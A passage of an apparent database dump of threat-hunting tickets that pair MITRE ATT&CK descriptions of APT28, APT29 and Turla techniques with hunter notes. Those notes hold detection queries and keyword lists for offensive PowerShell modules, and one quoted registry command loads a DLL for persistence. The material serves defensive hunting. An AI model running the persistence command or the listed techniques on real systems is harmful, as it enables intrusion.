OR 800 OR 4103 OR 4104 OR 4688) AND (\"dir\" OR \"tree\" OR \"find\" OR \"locate\" OR \"ls\")\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/001/\r\n</pre>','Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. [1] These programs will be executed under the context of the user and will have the account\'s associated permissions level.\r\n\r\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.\r\n\r\n<pre>\r\nThe following run keys are created by default on Windows systems:\r\n\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\r\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\r\n</pre>\r\n\r\nRun keys may exist under multiple hives.[2][3] The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. [4] For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" [5]\r\n\r\n<pre>\r\nThe following Registry keys can be used to set startup folder items for persistence:\r\n\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\r\n</pre>\r\n\r\n<pre>\r\nThe following Registry keys can control automatic startup of services during boot:\r\n\r\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\r\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\r\n</pre>\r\n\r\n<pre>\r\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\r\n\r\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\r\n</pre>\r\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit and HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell subkeys can automatically launch programs.\r\n\r\nPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run when any user logs on.\r\n\r\nBy default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\r\n\r\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.*+Hunter Notes:+*\r\n<pre>\r\n\r\n(EventID: 1 OR 11) AND *AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start*\r\n\r\nThe above is for initial creation.  Validation of all files in C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ will need to be accomplished with Endgame\r\n\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"dir\" OR \"tree\" OR \"find\" OR \"locate\" OR \"ls\")\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/001/\r\n</pre>'),(338,361,'attr','parent_id','131','5'),(339,362,'attr','parent_id','131','5'),(340,363,'relation','copied_to',NULL,'171'),(341,364,'relation','copied_from',NULL,'170'),(342,365,'attr','description','added their own devices as allowed IDs for active sync using Set-CASMailbox, allowing it to obtain copies of victim mailboxes. It also added additional permissions (such as Mail.Read and Mail.ReadWrite) to compromised Application or Service Principals\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND \"Set-CASMailbox\"\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\n\r\n</pre>','Adversaries may grant additional permission levels, such as ReadPermission or FullAccess, to maintain persistent access to an adversary-controlled email account. The Add-MailboxPermission PowerShell cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.\r\n\r\nThis may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can assign more access rights to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: Internal Spearphishing), so the messages evade spam/phishing detection mechanisms.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND \"Set-CASMailbox\"\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\n\r\n</pre>'),(343,366,'attr','description','Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.\r\n\r\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary\'s goals. Cloud providers may have different ways in which their virtual networks operate.[1][2][3]\r\n\r\nUtilities and commands that acquire this information include netstat, \"net use,\" and \"net session\" with Net. In Mac and Linux, netstat and lsof can be used to list current connections. who -a and w can be used to show which users are currently logged in, similar to \"net session\".\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\n(Playbook) T1087 - Account Discovery - CYH\r\nEventID: (1 OR 800 OR 4103 OR 4104 OR 4688) AND ProcessName: <Netstat, etc>\r\n\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"arp -a\" OR \"nbtstat -n\" OR \"net config\" OR \"ipconfig /all\" OR route)\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1049/\r\n</pre>','Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.\r\n\r\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary\'s goals. Cloud providers may have different ways in which their virtual networks operate.[1][2][3]\r\n\r\nUtilities and commands that acquire this information include netstat, \"net use,\" and \"net session\" with Net. In Mac and Linux, netstat and lsof can be used to list current connections. who -a and w can be used to show which users are currently logged in, similar to \"net session\".\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\n(Playbook) T1087 - Account Discovery - CYH\r\nEventID: (1 OR 800 OR 4103 OR 4104 OR 4688) AND ProcessName: <Netstat, etc>\r\n\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"arp -a\" OR \"nbtstat -n\" OR \"net config\" OR \"ipconfig /all\" OR route)\r\n\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"netstat -an\" OR \"net use\" OR \"net file\" OR \"net session\" OR \"net time\")\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1049/\r\n</pre>'),(344,367,'attr','subject','Event Triggered Execution - T1546.003 / .008','Event Triggered Execution - T1546.003'),(345,367,'attr','description','(003)APT 29 used sticky-keys to obtain unauthenticated, privileged console access. \r\n(008)APT 29 has used WMI to establish persistence.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nSigma rule: sysmon_stickykey_like_backdoor.yml\r\n(Playbook) T1546 - Event Triggered Execution\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1546/003/\r\n</pre>','Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user logging, or the computer\'s uptime. [1]\r\n\r\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. [2] [3] Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription. [4] [5]\r\n\r\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.\r\n\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nSigma rule: sysmon_stickykey_like_backdoor.yml\r\n(Playbook) T1546 - Event Triggered Execution\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1546/003/\r\n</pre>'),(346,368,'attr','description','An APT28 loader Trojan adds the Registry key HKCU\\Environment\\UserInitMprLogonScript to establish persistence.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\n(Playbook) T1137- Office Application Startup\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1037/001/\r\n</pre>','Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.[1] This is done via adding a path to a script to the HKCU\\Environment\\UserInitMprLogonScript Registry key.[2]\r\n\r\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\n(Playbook) T1137- Office Application Startup\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1037/001/\r\n</pre>'),(347,369,'attr','description','Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\r\n\r\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\r\n\r\nRefrences:\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+-+T1106+-+Native+API%27\r\nhttps://confluence.di2e.net/display/CYH836/Turla%3A+T1016+-+System+Network+Configuration+Discovery?src=contextnavpagetreemode\r\nhttps://attack.mitre.org/techniques/T1016/\r\n</pre>\r\n','Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\r\n\r\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"arp -a\" OR \"nbtstat -n\" OR \"net config\" OR \"ipconfig /all\" OR route)\r\n</pre>\r\n\r\nRefrences:\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+-+T1106+-+Native+API%27\r\nhttps://confluence.di2e.net/display/CYH836/Turla%3A+T1016+-+System+Network+Configuration+Discovery?src=contextnavpagetreemode\r\nhttps://attack.mitre.org/techniques/T1016/\r\n</pre>\r\n'),(348,370,'attr','subject','Event Triggered Execution - T15460.015','Event Triggered Execution - T1546.015'),(349,370,'attr','description','APT28 has used COM hijacking for persistence by replacing the legitimate MMDeviceEnumerator object with a payload.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : (12 OR 13 OR 14) AND HKCU\\\\Software\\\\Classes\\\\CLSID\\\\*\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>https://attack.mitre.org/techniques/T1546/015/\r\n</pre>','Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.[1] References to various COM objects are stored in the Registry.\r\n\r\nAdversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary\'s code will be executed instead.[2] An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.\r\n\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : (12 OR 13 OR 14) AND HKCU\\\\Software\\\\Classes\\\\CLSID\\\\*\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>https://attack.mitre.org/techniques/T1546/015/\r\n</pre>'),(350,371,'attr','description','APT 29 has bypassed UAC\r\n\r\n+*Hunter Notes*+\r\n<pre>\r\nHost: \r\nSigma rules: sysmon_uac_bypass_sdclt.yml sysmon_uac_bypass_eventvwr.yml win_susp_powershell_empire_uac_bypass.yml win_uac_fodhelper.yml win_uac_cmstp.yml win_uac_wsreset.yml win_wsreset_uac_bypass.yml sysmon_uac_bypass_via_dism.yml\r\n</pre>\r\n\r\n+*Reference*+\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1548/\r\n</pre> ','Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. [1]\r\n\r\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box. [2] [3] An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.[4]\r\n\r\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods[5] that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\r\n\r\n    eventvwr.exe can auto-elevate and execute a specified binary or script.[6][7]\r\n\r\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.\r\n\r\n+*Hunter Notes*+\r\n<pre>\r\nHost: \r\nSigma rules: sysmon_uac_bypass_sdclt.yml sysmon_uac_bypass_eventvwr.yml win_susp_powershell_empire_uac_bypass.yml win_uac_fodhelper.yml win_uac_cmstp.yml win_uac_wsreset.yml win_wsreset_uac_bypass.yml sysmon_uac_bypass_via_dism.yml\r\n</pre>\r\n\r\n+*Reference*+\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1548/\r\n</pre> '),(351,372,'attr','description','Turla has also used PowerSploit\'s Invoke-ReflectivePEInjection.ps1 to reflectively load a PowerShell payload into a random process on the victim system. Turla has used Metasploit to perform reflective DLL injection in order to escalate privileges.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nEventID : (800 OR 4103 OR 4104) AND \"invoke-screencapture\" OR \"get-clipboard\" OR \"inject-shellcode\" OR \"get-keystrokes\" OR \"downloadstrings\" OR \"downloadfile\" OR \"Invoke-ReflectivePEInjection\"\r\n\r\nA query for dangerous powershell modules\r\n(Sigma)windows/builtin/win_metasploit_authentication\r\n(Sigma)proxy/proxy_ua_frameworks\r\n(Sigma)linux/lnx_shell_susp_commands\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1055/001/\r\n</pre>\r\n','Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.\r\n\r\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as VirtualAllocEx and WriteProcessMemory, then invoked with CreateRemoteThread (which calls the LoadLibrary API responsible for loading the DLL). [1]\r\n\r\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of LoadLibrary).[2][1]\r\n\r\nRunning code in the context of another process may allow access to the process\'s memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.\r\n\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nEventID : (800 OR 4103 OR 4104) AND \"invoke-screencapture\" OR \"get-clipboard\" OR \"inject-shellcode\" OR \"get-keystrokes\" OR \"downloadstrings\" OR \"downloadfile\" OR \"Invoke-ReflectivePEInjection\"\r\n\r\nA query for dangerous powershell modules\r\n(Sigma)windows/builtin/win_metasploit_authentication\r\n(Sigma)proxy/proxy_ua_frameworks\r\n(Sigma)linux/lnx_shell_susp_commands\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1055/001/\r\n</pre>\r\n'),(352,373,'attr','subject','Permission Groups Discovery: Local Groups - T1069.001 / .002','Permission Groups Discovery: Local Groups - T1069.001 '),(353,373,'attr','description','Turla has used net localgroup and net localgroup Administrators to enumerate group information, including members of the local administrators group. Turla has used net group \"Domain Admins\" /domain to identify domain administrators.\r\n\r\n*+Hunter Notes:+* \r\n<pre>\r\nHost:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"net localgroup\" OR \"net localgroup Administrators\") OR (\"net group \"Domain Admins\" /domain\")\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1069/001/\r\n</pre>','Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\r\n\r\nCommands such as net localgroup of the Net utility, dscl . -list /Groups on macOS, and groups on Linux can list local groups.\r\n\r\n*+Hunter Notes:+* \r\n<pre>\r\nHost:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"net localgroup\" OR \"net localgroup Administrators\") OR (\"net group \"Domain Admins\" /domain\")\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1069/001/\r\n</pre>'),(354,374,'attr','description','Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as Ping or net view using Net. Adversaries may also use local host files (ex: C:\\Windows\\System32\\Drivers\\etc\\hosts or /etc/hosts) in order to discover the hostname to IP address mappings of remote systems.\r\n\r\nSpecific to macOS, the bonjour protocol exists to discover additional Mac-based systems within the same broadcast domain.\r\n\r\nRefrences:\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+T1018+-+Remote+System+Discovery\r\n</pre>','Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as Ping or net view using Net. Adversaries may also use local host files (ex: C:\\Windows\\System32\\Drivers\\etc\\hosts or /etc/hosts) in order to discover the hostname to IP address mappings of remote systems.\r\n\r\nSpecific to macOS, the bonjour protocol exists to discover additional Mac-based systems within the same broadcast domain.\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost: \r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"net view\" OR \"net group\")\r\n</pre>\r\n\r\n*+Refrences:+*\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+T1018+-+Remote+System+Discovery\r\n</pre>'),(355,375,'attr','description','Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as Ping or net view using Net. Adversaries may also use local host files (ex: C:\\Windows\\System32\\Drivers\\etc\\hosts or /etc/hosts) in order to discover the hostname to IP address mappings of remote systems.\r\n\r\nSpecific to macOS, the bonjour protocol exists to discover additional Mac-based systems within the same broadcast domain.\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost: \r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"net view\" OR \"net group\")\r\n</pre>\r\n\r\n*+Refrences:+*\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+T1018+-+Remote+System+Discovery\r\n</pre>','Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as Ping or net view using Net. Adversaries may also use local host files (ex: C:\\Windows\\System32\\Drivers\\etc\\hosts or /etc/hosts) in order to discover the hostname to IP address mappings of remote systems.\r\n\r\nSpecific to macOS, the bonjour protocol exists to discover additional Mac-based systems within the same broadcast domain.\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost: \r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"net view\" OR \"net group\")\r\n</pre>\r\n\r\n*+Refrences:+*\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+T1018+-+Remote+System+Discovery\r\nhttps://attack.mitre.org/techniques/T1018/\r\n</pre>'),(356,376,'attr','description','APT29 has used valid accounts, including administrator accounts, to help facilitate lateral movement on compromised networks.\r\n\r\n<pre>\r\nHunter Notes:\r\nSMB; compare users and checkout new accounts (look to automate) | VLOOKUP for excel | SCRIPTS THAT ARE PRE BUILT\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1078/002/\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1210%3A+Exploitation+of+Remote+services\r\n</pre>','Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. [1] Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.[2]\r\n\r\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.\r\n\r\n\r\n<pre>\r\nHunter Notes:\r\nSMB; compare users and checkout new accounts (look to automate) | VLOOKUP for excel | SCRIPTS THAT ARE PRE BUILT\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1078/002/\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1210%3A+Exploitation+of+Remote+services\r\n</pre>'),(357,377,'attr','description','APT29 used Kerberos ticket attacks for lateral movement.\r\n\r\n<pre>\r\nHunter Notes:\r\nReally hard to hunt | Look for Kerberos activity without going to DC\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1550/003/\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1550.003+Pass+the+Ticket\r\n</pre>','Adversaries may \"pass the ticket\" using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account\'s password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\r\n\r\nWhen preforming PtT, valid Kerberos tickets for Valid Accounts are captured by OS Credential Dumping. A user\'s service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.\r\n\r\nA Silver Ticket can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).\r\n\r\nA Golden Ticket can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.\r\n\r\nAdversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. Pass the Hash) while also using the password hash to create a valid Kerberos ticket.\r\n<pre>\r\nHunter Notes:\r\nReally hard to hunt | Look for Kerberos activity without going to DC\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1550/003/\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1550.003+Pass+the+Ticket\r\n</pre>'),(358,378,'attr','description','APT28 used weaponized Microsoft Word documents abusing the remote template function to retrieve a malicious macro.\r\n\r\n<pre>\r\nHunter Notes:\r\nSuricata alert + a file extension in URL could ID this.\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1221/\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+T1221+-+Template+Injection\r\n</pre>','Adversaries may create or modify references in Office document templates to conceal malicious code or force authentication attempts. Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered. [1]\r\n\r\nProperties within parts may reference shared public resources accessed via online URLs. For example, template properties reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.\r\n\r\nAdversaries may abuse this technology to initially conceal malicious code to be executed via documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. [2] These documents can be delivered via other techniques such as Phishing and/or Taint Shared Content and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. [3] Examples have been seen in the wild where template injection was used to load malicious code containing an exploit. [4]\r\n\r\nThis technique may also enable Forced Authentication by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.\r\n\r\n<pre>\r\nHunter Notes:\r\nSuricata alert + a file extension in URL could ID this.\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1221/\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+T1221+-+Template+Injection\r\n</pre>'),(359,379,'attr','description','APT28 has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network. The group has specifically used credentials stolen through a spearphishing email to login to the network. The group has also leveraged default manufacturer\'s passwords to gain initial access to corporate networks via IoT devices such as a VOIP phone, printer, and video decoder.\r\n\r\n<pre>\r\nHunter Notes:\r\nWould be hard to ID\r\n</pre>\r\n\r\n<pre>\r\nReference: \r\nhttps://attack.mitre.org/techniques/T1078/002/\r\n</pre>','Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. [1] Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.[2]\r\n\r\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.\r\n\r\n<pre>\r\nHunter Notes:\r\nWould be hard to ID\r\n</pre>\r\n\r\n<pre>\r\nReference: \r\nhttps://attack.mitre.org/techniques/T1078/002/\r\n</pre>'),(360,380,'attr','description','APT28 has used pass the hash for lateral movement.\r\n\r\n<pre>\r\nHunter Notes:\r\nHard to hunt\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1550/002/\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+T1550.002+-+Pass+the+Hash\r\n</pre>','Adversaries may \"pass the hash\" using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user\'s clear text password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\r\n\r\nWhen performing PtH, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\r\n\r\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform Pass the Ticket attacks.\r\n\r\n<pre>\r\nHunter Notes:\r\nHard to 